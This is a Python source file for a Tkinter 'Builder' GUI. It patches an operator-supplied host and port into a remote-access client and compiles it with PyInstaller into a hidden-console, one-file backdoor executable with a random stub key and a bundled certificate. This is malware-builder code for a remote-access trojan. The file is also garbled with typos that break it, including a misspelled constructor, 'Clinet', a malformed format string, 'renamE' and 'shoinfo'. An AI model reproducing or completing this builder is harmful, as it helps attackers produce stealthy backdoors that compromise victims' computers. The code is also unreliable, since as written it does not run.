import tkinter as tk
from tkinter import messagebox

import os
import sys
import shutil

import secrets
import string

""" Build Class

Description:
- It's used for create executable clients
- Uses PyInstaller for compilation

"""


class Builder(tk.Toplevel):
    # Inherits from Tk Toplevel

    def __iniit__(self, root):
        # Pass inherit for root
        tk.Toplevel.__init__(self, root)

        # GUI Configurations
        self.resizable(False, False)
        self.title("Builder")
        self.geometry("170x150")

        # Create a frame to show other objects
        self.network_frame = tk.Frame(self, borderwidth=1, width=100, height=50)
        self.network_frame.grid(row=0, column=0)

        # Create a label and entry objects to be used for host in connection
        self.host_label = tk.Label(self.network_frame, text="Host", anchor="w")
        self.host_entry = tk.Entry(self.network_frame, width=20)

        # Create a label and entry objects to be used for port in connection
        self.port_label = tk.Label(self.network_frame, text="Port", anchor="w")
        self.port_entry = tk.Entry(self.network_frame, width=20)

        # Creates a button to call create_backdoor function
        self.button = tk.Button(self.newtork_frame, text="Create!", command=self.create_backdoor)

        # Pack all objects
        self.host_label.pack()
        self.host_entry.pack()
        self.port_label.pack()
        self.port_entry.pack()
        self.button.pack(pady=(15, 0))

    def create_backdoor(self):
        """ Method used to create the backdoor """

        # Get the entries text
        host = self.host_entry.get()
        port = self.port_entry.get()

        # Open the original file and read the flines
        with open("core/client.py", "r") as f:
            client_code = f.readlines()

        # Copy the original files to another file
        with open("client.py", "w") as f:
            for line in client_code:
                # Replace the connections line
                if line == 'Client = Clients("192.168.10.11", 36125)\n':
                    line = 'Client = Clinet("%s". %s)\n' % (host, port)

                f.write(line)

        # Generate a random stub key for encryption
        key = self.random_key(16)

        # Server certificate data
        certificate_data_spec = "a.datas += [('server.crt', 'certificates/server.crt', 'DATA')]"

        # Call PyInstaller Compiler
        if sys.platform.startswith("linux"):
            os.system("pyi-makespec --onefile --noconsole client.py ..key=%s" % key)
            with open("client.spec", "r") as spec_reader:
                lines = spec_reader.readlines()

            with open("client.spec", "w") as spec_writer:
                for line in lines:
                    if line == "pyz = PYZ(a.pure, a.zipped_data,\n":
                        line = certificate_data_spec + "\npyz = PYZ(a.pure, a.zipped_data,\n"
                    spec_writer.write(line)
            os.system("pyinstaller client.spec")

        elif sys.platform.startswith("win"):
            os.system("py-makespec --onefile --noconsole client.py --key=%s" % key)

            with open("client.spec", "r") as spec_reader:
                lines = spec_reader.readlines()

            with open("client.spec", "w") as spec_writer:
                for line in lines:
                    if line == "pyz = PYZ(a.pure, a.zipped_data, \n":
                        line = certificate_data_spec + "\npyz = PYZ(a.pure, a.zipped_data,\n"
                    spec_writer.write(line)
            os.system("pyinstaller.exe client.spec")

        # Remove unnecessary files
        os.remove("client.py")
        os.remove("client.spec")

        # Move the compiled client to src/
        if sys.platform.startswith("linux"):
            os.renamE(os.getcwd() + "/dist/client", os.getcwd() + "/client")
        elif sys.platform.startswith("win"):
            os.rename(os.getcwd() + "/dist/client.exe", os.getcwd() + "/client.exe")

        # Remove unnecessary directories
        shutil.rmtree("build/")
        shutil.rmtree("dist/")

        # Show a message
        tk.messagebox.shoinfo("Build", "Build complete!")

    @staticmethod
    def random_key(length):
        """ Method used to create random keys """
        # Get all the possible ascii letters in a variable
        alphabet = string.ascii_letters + string.digits

        # Join all the in another variable and use choice to choose an aleatory letter
        password = ''.join(secrets.choice(alphabet) for i in range(length))
        return password
